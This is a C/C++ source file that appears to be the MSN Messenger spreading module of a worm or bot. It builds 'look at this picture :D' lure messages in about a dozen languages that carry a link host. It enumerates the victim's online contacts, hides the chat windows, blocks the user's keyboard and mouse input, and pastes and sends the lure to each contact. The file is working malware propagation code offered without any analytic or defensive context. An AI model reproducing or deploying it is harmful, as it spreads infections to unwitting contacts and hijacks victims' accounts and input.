#include "includes.h"

#import "MSNMessengerAPI.tlb" named_guids, no_namespace

char msnIMHost[256] = "";

char *GetLangMSN(char *msnBuffer, unsigned int msnSize)
{
   switch (GetSystemDefaultLangID())
   {
      case 0x040c: 
		_snprintf(msnBuffer, msnSize, "regardez cette photo :D %s", msnIMHost);
         break;
	  case 0x0407: 
	     _snprintf(msnBuffer, msnSize, "schau mal das foto an :D %s", msnIMHost);
         break;
	  case 0x040a: 
         _snprintf(msnBuffer, msnSize, "mira esta fotografía :D %s", msnIMHost);
         break;
	  case 0x0413: 
	     _snprintf(msnBuffer, msnSize, "bekijk deze foto :D %s", msnIMHost);
         break;
	  case 0x0409: 
         _snprintf(msnBuffer, msnSize, "look at this picture :D %s", msnIMHost);
         break;
	  case 0x0410: 
         _snprintf(msnBuffer, msnSize, "guardare quest'immagine :D %s", msnIMHost);
         break; 
	  case 0x0405: 
	    _snprintf(msnBuffer, msnSize, "podívejte se na mou fotku :D %s", msnIMHost);
		 break;
	  case 0x0406: 
	    _snprintf(msnBuffer, msnSize, "ser på dette billede :D %s", msnIMHost);
		 break;
	  case 0x040e: 
	    _snprintf(msnBuffer, msnSize, "nézd meg a képet :D %s", msnIMHost);
		 break;
	  case 0x0414: 
	    _snprintf(msnBuffer, msnSize, "se på dette bildet :D %s", msnIMHost);
		 break;	  
	  case 0x0415:
	    _snprintf(msnBuffer, msnSize, "spojrzec na zdjecie :D %s", msnIMHost);
		 break;
	  case 0x0416: 
	    _snprintf(msnBuffer, msnSize, "olhar para esta foto :D %s", msnIMHost);
		 break;
	
	  default: 
         _snprintf(msnBuffer, msnSize, "seen this? :D %s", msnIMHost);
         break;
   }
   return (msnBuffer);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void to_variant(BSTR, VARIANT& vt);

char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;
			if (slen < plen)
				return (NULL);
		}
		sptr = start;
		pptr = (char *) Pattern;
		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;
			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void msnworm(char *msnMessage)
{
	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
    HRESULT hr = CoCreateInstance(CLSID_Messenger,NULL,CLSCTX_ALL,IID_IMSNMessenger2,(void**)&pIMessenger);

	if (SUCCEEDED(hr))
	{
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;

			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
				
					
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void**)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());										
									
										key_type(msnMessage,(HWND) wndIM);
										
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																			
									
									}
									pIMessengerWindow->Release();
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
			        BlockInput(false);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 